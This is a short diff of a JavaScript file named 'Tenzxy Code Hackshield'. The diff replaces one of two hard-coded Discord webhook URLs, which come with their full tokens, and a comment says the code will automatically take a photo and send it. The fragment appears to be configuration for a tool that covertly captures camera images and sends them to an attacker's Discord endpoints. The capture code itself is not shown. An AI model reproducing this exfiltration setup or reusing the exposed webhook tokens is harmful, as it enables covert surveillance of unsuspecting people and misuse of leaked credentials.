@@ -1,7 +1,7 @@
 // -- Tenzxy Code Hackshield -- //
 
 const discordWebhookUrl1 = 'https://discord.com/api/webhooks/1354893074702008360/VQ1E0H9PGmiF-dirC1SVYTzLvTMJ-G6TdJw_tUZ-hYdzdRkRVN3DFD0dOR330ZJn7KbF';
-const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1354893074702008360/VQ1E0H9PGmiF-dirC1SVYTzLvTMJ-G6TdJw_tUZ-hYdzdRkRVN3DFD0dOR330ZJn7KbF';
+const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1382615136421806130/THWMLTxPnfHDS-SQj84aJRcX3kmsZWU7TM5XWRQtn6iKUYfJjJUJtjpFGlUak_-mdaYZ';
 const discordChannelUrl = 'https://discord.gg/agBt2AN9Wx';
 
 // Automatically take a photo and send it
